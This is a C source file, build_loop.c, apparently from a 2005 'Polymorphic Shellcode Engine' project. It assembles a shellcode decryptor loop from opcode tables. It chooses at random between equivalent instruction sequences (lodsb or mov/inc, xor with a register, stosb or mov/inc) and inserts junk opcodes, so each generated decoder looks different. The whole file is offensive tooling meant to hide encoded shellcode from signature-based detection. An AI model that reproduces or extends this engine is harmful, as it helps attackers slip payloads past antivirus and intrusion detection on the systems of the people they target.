/*
** build_loop.c for Polymorphic Shellcode Engine project
** 
** Made by eee
** 
** Started on  Tue Apr 12 22:01:55 2005 eee
** Last update Tue Apr 12 22:03:45 2005 eee
*/

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pse.h>

extern t_tab	gl_loop[];
extern t_tab	gl_junk1[];
extern t_tab	gl_junk2[];

void	build_loop(t_env *env)
{
  memcpy(env->decrypt++, &gl_loop[0].op, 1);
  printf("%s\n",gl_loop[0].desc);
  env->decrypt = step1(env->decrypt);
  env->decrypt = step2(env->decrypt, env->reg);
  env->decrypt = step3(env->decrypt);
  memcpy(env->decrypt, &gl_loop[11].op, 2);
  printf("%s\n",gl_loop[11].desc);
}

/*lodsb + junk ou mov al, esi + inc esi*/
char	*step1(char *decrypt)
{
  int	rnd;

  if (random() % 2)
    {
      memcpy(decrypt++, &gl_loop[1].op, 1);
      rnd = random() % TAB_JUNK2;
      memcpy(decrypt, &gl_junk2[rnd].op, 2);
      decrypt += 2;
      printf("%s\n%s\n",gl_loop[1].desc, gl_junk2[rnd].desc);
    }
  else
    {
      memcpy(decrypt, &gl_loop[2].op, 2);
      decrypt += 2;
      memcpy(decrypt++, &gl_loop[3].op, 2);
      printf("%s\n%s\n",gl_loop[2].desc, gl_loop[3].desc);
    }
  return (decrypt);
}

/* xor al, reg8 + inc reg8  */
char	*step2(char *decrypt, int reg)
{
  if (reg == 0)
    {
      memcpy(decrypt, &gl_loop[4].op, 2);
      decrypt += 2;
      memcpy(decrypt, &gl_loop[6].op, 2);
      decrypt += 2;
      printf("%s\n%s\n",gl_loop[4].desc, gl_loop[6].desc);
    }
  else
    {
      memcpy(decrypt, &gl_loop[5].op, 2);
      decrypt += 2;
      memcpy(decrypt, &gl_loop[7].op, 2);
      decrypt += 2;
      printf("%s\n%s\n",gl_loop[5].desc, gl_loop[7].desc);
    }
  return (decrypt);
}

/*  mov edi, al + inc edi ou stosb + junk */
char	*step3(char *decrypt)
{
  int	rnd;

   if (random() % 2)
    {
      memcpy(decrypt, &gl_loop[8].op, 2);
      decrypt += 2;
      memcpy(decrypt++, &gl_loop[9].op, 1);
      printf("%s\n%s\n",gl_loop[8].desc, gl_loop[9].desc);
    }
  else
    {
      memcpy(decrypt++, &gl_loop[10].op, 1);
      rnd = random() % TAB_JUNK2;
      memcpy(decrypt, &gl_junk2[rnd].op, 2);
      decrypt += 2;
      printf("%s\n%s\n",gl_loop[10].desc, gl_junk2[rnd].desc);
    }
   return (decrypt);
}
